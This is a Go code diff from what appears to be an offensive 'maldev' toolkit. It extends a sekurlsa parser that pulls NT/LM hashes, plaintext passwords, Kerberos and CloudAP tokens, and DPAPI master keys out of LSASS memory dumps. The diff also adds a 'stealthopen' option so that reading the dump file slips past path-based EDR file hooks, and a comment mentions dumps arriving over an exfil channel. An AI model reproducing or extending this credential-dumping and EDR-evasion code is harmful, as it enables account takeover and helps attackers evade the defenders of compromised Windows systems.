@@ -4,8 +4,9 @@ import (
 	"errors"
 	"fmt"
 	"io"
-	"os"
 	"time"
+
+	"github.com/oioio-space/maldev/evasion/stealthopen"
 )
 
 // Sentinel errors. Callers use errors.Is to dispatch.
@@ -24,9 +25,9 @@ var (
 	// process or if the module-list capture failed.
 	ErrLSASRVNotFound = errors.New("sekurlsa: lsasrv.dll module not in MODULE_LIST")
 
-	// ErrMSV1_0NotFound fires when msv1_0.dll isn't in MODULE_LIST.
+	// ErrMSVNotFound fires when msv1_0.dll isn't in MODULE_LIST.
 	// Same diagnosis as ErrLSASRVNotFound but for the MSV provider.
-	ErrMSV1_0NotFound = errors.New("sekurlsa: msv1_0.dll module not in MODULE_LIST")
+	ErrMSVNotFound = errors.New("sekurlsa: msv1_0.dll module not in MODULE_LIST")
 
 	// ErrKeyExtractFailed fires when pattern matching succeeded but
 	// the decoded BCRYPT_KEY_DATA_BLOB header is malformed (bad magic,
@@ -111,13 +112,30 @@ func (lt LogonType) String() string {
 }
 
 // Credential is the typed payload extracted for a single logon
-// session. v1 ships exactly one variant: MSV1_0Credential. Future
-// providers (Wdigest, Kerberos, TSPkg, CloudAP) implement this same
-// interface so callers can range over Session.Credentials uniformly.
+// session. Every shipped provider (MSV / Wdigest / DPAPI / Kerberos
+// / TSPkg / CredMan / CloudAP / LiveSSP) implements it so callers
+// can range over Session.Credentials uniformly.
+//
+// Storage discipline: only POINTER values (*XxxCredential) satisfy
+// this interface — wipe() has a pointer receiver so it can zeroize
+// the underlying buffers in place. Constructing []Credential
+// always uses &XxxCredential{...} or returning *XxxCredential.
 type Credential interface {
 	// AuthPackage returns the Windows auth-package name —
-	// "MSV1_0", "Wdigest", "Kerberos", "TSPkg", "CloudAP".
+	// "MSV1_0", "Wdigest", "Kerberos", "TSPkg", "CloudAP",
+	// "CredMan", "LiveSSP", "DPAPIMasterKey".
 	AuthPackage() string
+
+	// wipe zeroizes every sensitive byte buffer (NT/LM/SHA1
+	// hashes, plaintext passwords, PRT bytes, master keys, …)
+	// inside the credential. Result.Wipe calls this on every
+	// credential of every session before discarding the Result.
+	//
+	// Unexported intentionally: only the sekurlsa package adds
+	// Credential implementations, so the interface enforces the
+	// wipe contract at compile time without exposing the method
+	// to external consumers.
+	wipe()
 }
 
 // LogonSession aggregates everything the parser knows about a single
@@ -152,10 +170,8 @@ func (r *Result) Wipe() {
 		return
 	}
 	for i := range r.Sessions {
-		for j := range r.Sessions[i].Credentials {
-			if w, ok := r.Sessions[i].Credentials[j].(interface{ wipe() }); ok {
-				w.wipe()
-			}
+		for _, c := range r.Sessions[i].Credentials {
+			c.wipe()
 		}
 	}
 }
@@ -208,7 +224,7 @@ func Parse(reader io.ReaderAt, size int64) (*Result, error) {
 		// covers the MSV provider even though the LogonSessionList head
 		// itself lives in lsasrv. Future providers (NetLogon, …) may
 		// branch on which auth-package DLLs are loaded.
-		return res, ErrMSV1_0NotFound
+		return res, ErrMSVNotFound
 	}
 
 	keys, err := extractLSAKeys(r, lsasrv, tmpl)
@@ -216,7 +232,7 @@ func Parse(reader io.ReaderAt, size int64) (*Result, error) {
 		return res, err
 	}
 
-	sessions, warnings := extractMSV1_0(r, lsasrv, tmpl, keys)
+	sessions, warnings := extractMSV(r, lsasrv, tmpl, keys)
 	res.Warnings = append(res.Warnings, warnings...)
 
 	// Wdigest is opt-in per Template (NodeSize=0 disables it). The
@@ -296,8 +312,13 @@ func Parse(reader io.ReaderAt, size int64) (*Result, error) {
 // Parse. Closes the file before returning. Use Parse directly when
 // the dump comes from memory (gzip-decompressed bytes, an exfil
 // channel, etc.).
-func ParseFile(path string) (*Result, error) {
-	f, err := os.Open(path)
+//
+// `opener` is the optional stealthopen.Opener — pass nil for plain
+// os.Open, non-nil to route the dump-file read through a stealth
+// strategy (NTFS Object ID, etc.) so a path-based EDR file hook
+// never sees the dump path.
+func ParseFile(path string, opener stealthopen.Opener) (*Result, error) {
+	f, err := stealthopen.Use(opener).Open(path)
 	if err != nil {
 		return nil, err
 	}
